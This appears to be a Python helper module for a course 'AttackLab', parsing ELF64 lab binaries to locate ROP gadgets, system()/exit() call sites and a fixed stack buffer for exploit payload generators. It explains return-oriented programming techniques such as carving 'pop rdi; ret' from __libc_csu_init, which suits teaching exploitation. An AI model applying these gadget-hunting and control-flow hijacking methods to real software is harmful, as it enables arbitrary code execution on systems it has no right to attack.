#!/usr/bin/env python3
"""attacklab.py -- dependency-free ELF64 helpers for the AttackLab payload generators.

Each exploit needs a handful of exact addresses from the lab binaries: grade_eval,
the __libc_csu_init "pop rdi; ret" gadget, the two call sites that set up
system()/exit(), and (for dark-calc) the fixed-stack buffer.  Instead of
hardcoding those addresses, resolve them straight from the target binary so the
payloads stay correct even if attack/* is rebuilt with different addresses.

The binaries are non-PIE ET_EXEC linked at 0x400000, so every symbol value and
instruction address is a fixed virtual address.  Only the Python standard library
is used, so `python3 payload.py` runs anywhere without binutils.
"""
from __future__ import annotations

import re
import struct

# --- ELF64 constants ---------------------------------------------------------
PT_LOAD = 1
SHT_SYMTAB = 2
SHT_DYNSYM = 11


def _u16(b, o):
    return struct.unpack_from("<H", b, o)[0]


def _u32(b, o):
    return struct.unpack_from("<I", b, o)[0]


def _u64(b, o):
    return struct.unpack_from("<Q", b, o)[0]


class Elf:
    """Minimal little-endian ELF64 reader: symbols, sections and .text bytes."""

    def __init__(self, path):
        with open(path, "rb") as f:
            self.data = f.read()
        if self.data[:4] != b"\x7fELF" or self.data[4] != 2 or self.data[5] != 1:
            raise ValueError(f"{path}: not a little-endian ELF64 file")
        self._load_segments()
        self._load_sections()
        self._load_symbols()
        self._locate_text()

    # -- program headers (PT_LOAD), for virtual-address -> file-offset mapping --
    def _load_segments(self):
        e_phoff = _u64(self.data, 0x20)
        e_phentsize = _u16(self.data, 0x36)
        e_phnum = _u16(self.data, 0x38)
        self.segments = []
        for i in range(e_phnum):
            o = e_phoff + i * e_phentsize
            if _u32(self.data, o) != PT_LOAD:
                continue
            self.segments.append({
                "off": _u64(self.data, o + 8),
                "vaddr": _u64(self.data, o + 16),
                "filesz": _u64(self.data, o + 32),
            })

    # -- section headers -------------------------------------------------------
    def _load_sections(self):
        e_shoff = _u64(self.data, 0x28)
        e_shentsize = _u16(self.data, 0x3A)
        e_shnum = _u16(self.data, 0x3C)
        e_shstrndx = _u16(self.data, 0x3E)
        self.sections = []
        for i in range(e_shnum):
            ho = e_shoff + i * e_shentsize
            self.sections.append({
                "ho": ho,
                "name_off": _u32(self.data, ho),
                "type": _u32(self.data, ho + 4),
                "addr": _u64(self.data, ho + 16),
                "off": _u64(self.data, ho + 24),
                "size": _u64(self.data, ho + 32),
                "link": _u32(self.data, ho + 40),
            })
        shstr = self.sections[e_shstrndx]
        shstr_base = shstr["off"]
        for s in self.sections:
            end = self.data.find(b"\x00", shstr_base + s["name_off"])
            s["name"] = self.data[shstr_base + s["name_off"]:end].decode()

    # -- symbol tables (.symtab + .dynsym) -------------------------------------
    def _load_symbols(self):
        self.symbols = {}  # name -> virtual address (defined symbols only)
        for sec in self.sections:
            if sec["type"] not in (SHT_SYMTAB, SHT_DYNSYM):
                continue
            strtab = self.sections[sec["link"]]
            stroff = strtab["off"]
            for so in range(sec["off"], sec["off"] + sec["size"], 24):
                name_off = _u32(self.data, so)
                shndx = _u16(self.data, so + 6)
                value = _u64(self.data, so + 8)
                if shndx == 0 or value == 0 or name_off == 0:
                    continue  # undefined / absolute-zero / empty
                end = self.data.find(b"\x00", stroff + name_off)
                name = self.data[stroff + name_off:end].decode()
                self.symbols.setdefault(name, value)  # keep the first definition

    def _locate_text(self):
        for s in self.sections:
            if s["name"] == ".text":
                self.text = s
                self.text_bytes = self.data[s["off"]:s["off"] + s["size"]]
                return
        raise ValueError("no .text section found")

    # -- public API ------------------------------------------------------------
    def symbol(self, name):
        """Virtual address of a defined symbol, falling back to `name@plt`."""
        if name in self.symbols:
            return self.symbols[name]
        if name + "@plt" in self.symbols:
            return self.symbols[name + "@plt"]
        raise KeyError(f"symbol {name!r} not found in {len(self.symbols)} symbols")

    def plt_stub(self, name):
        """Virtual address of the PLT entry for an imported function (e.g. `system`).

        x86-64 PLT entries are 16 bytes each; PLT[0] is the resolver trampoline and
        PLT[i] (i >= 1) corresponds to the (i-1)-th .rela.plt entry, in order.
        """
        plt = next(s for s in self.sections if s["name"] == ".plt")
        rela = next(s for s in self.sections if s["name"] == ".rela.plt")
        dynsym = next(s for s in self.sections if s["type"] == SHT_DYNSYM)
        dynstr = self.sections[dynsym["link"]]
        for j in range(0, rela["size"], 24):  # Elf64_Rela is 24 bytes
            r_info = _u64(self.data, rela["off"] + j + 8)
            sym_index = r_info >> 32
            sym_off = dynsym["off"] + sym_index * 24
            name_off = _u32(self.data, sym_off)
            end = self.data.find(b"\x00", dynstr["off"] + name_off)
            if self.data[dynstr["off"] + name_off:end].decode() == name:
                return plt["addr"] + 16 * (j // 24 + 1)
        raise KeyError(f"PLT stub for {name!r} not found")

    def find_bytes(self, pattern, unique=True):
        """Virtual addresses of every occurrence of `pattern` inside .text."""
        addrs = [self.text["addr"] + m.start()
                 for m in re.finditer(re.escape(pattern), self.text_bytes)]
        if unique and len(addrs) != 1:
            raise ValueError(f"expected exactly 1 match for {pattern.hex()}, got {len(addrs)}")
        return addrs

    def read_vaddr(self, vaddr, n):
        off = self._vaddr_to_off(vaddr)
        return self.data[off:off + n]

    def _vaddr_to_off(self, vaddr):
        for seg in self.segments:
            if seg["vaddr"] <= vaddr < seg["vaddr"] + seg["filesz"]:
                return seg["off"] + (vaddr - seg["vaddr"])
        raise ValueError(f"virtual address {vaddr:#x} is outside every PT_LOAD segment")


# --- exploit-specific resolvers ----------------------------------------------

def pop_rdi_ret(elf):
    """`pop rdi; ret`, entered one byte into __libc_csu_init's `41 5f c3` epilogue.

    The csu epilogue ends in `pop r15; ret` = 41 5f c3; starting at the middle
    byte yields `pop rdi` (5f) followed by `ret` (c3).
    """
    return elf.find_bytes(b"\x41\x5f\xc3")[0] + 1


def ret_gadget(elf):
    """A plain `ret` (the c3 byte right after the pop-rdi gadget), used to fix
    stack alignment before entering grade_eval."""
    return pop_rdi_ret(elf) + 1


def call_site_mov_edi_call(elf, imm32, callee):
    """Address of a `mov edi, imm32; call <callee>` sequence (the mov's address).

    Used to reach `system(command_buf)` and the `exit(0)` cleanup paths without
    hardcoding their instruction addresses.
    """
    callee_addr = elf.plt_stub(callee)
    needle = b"\xbf" + struct.pack("<I", imm32 & 0xFFFFFFFF) + b"\xe8"
    for vaddr in elf.find_bytes(needle, unique=False):
        rel = struct.unpack("<i", elf.read_vaddr(vaddr + 6, 4))[0]
        if (vaddr + 10 + rel) & 0xFFFFFFFFFFFFFFFF == callee_addr:
            return vaddr
    raise LookupError(f"`mov edi,{imm32:#x}; call {callee}` not found")


def exit0_call_site(elf):
    """`mov edi, 0; call exit@plt` -- input()'s empty-input exit path."""
    return call_site_mov_edi_call(elf, 0, "exit")


def system_command_buf_call_site(elf):
    """`mov edi, <command_buf>; call system@plt` -- eval()'s exec path."""
    return call_site_mov_edi_call(elf, elf.symbol("command_buf"), "system")


def fixed_stack_buffer(elf):
    """dark-calc's expression buffer address, derived from init_fixed_stack().

    init_fixed_stack() does `mmap(BASE, 0x802000, RWX, MAP_FIXED_NOREPLACE)`,
    guards both ends, then stores `fixed_stack_top = BASE + 0x801000` and
    __wrap_main() sets rsp to that top before calling main().  input()'s buffer
    sits exactly 0x30 bytes below the top (return addr + main's frame + input's
    frame), so the buffer address is fixed_stack_top - 0x30.
    """
    start = elf.symbol("init_fixed_stack")
    region = elf.read_vaddr(start, 0x200)  # init_fixed_stack is ~0x130 bytes

    bases = [struct.unpack("<Q", region[m.start() + 2:m.start() + 10])[0]
             for m in re.finditer(re.escape(b"\x48\xbf"), region)]  # movabs rdi, imm64
    addends = [struct.unpack("<I", region[m.start() + 2:m.start() + 6])[0]
               for m in re.finditer(re.escape(b"\x48\x05"), region)]  # add rax, imm32
    if len(bases) != 1 or len(addends) != 1:
        raise ValueError(f"unexpected init_fixed_stack patterns: bases={bases} addends={addends}")
    top = bases[0] + addends[0]
    return top - 0x30  # frame depth from fixed_stack_top down to input()'s buffer
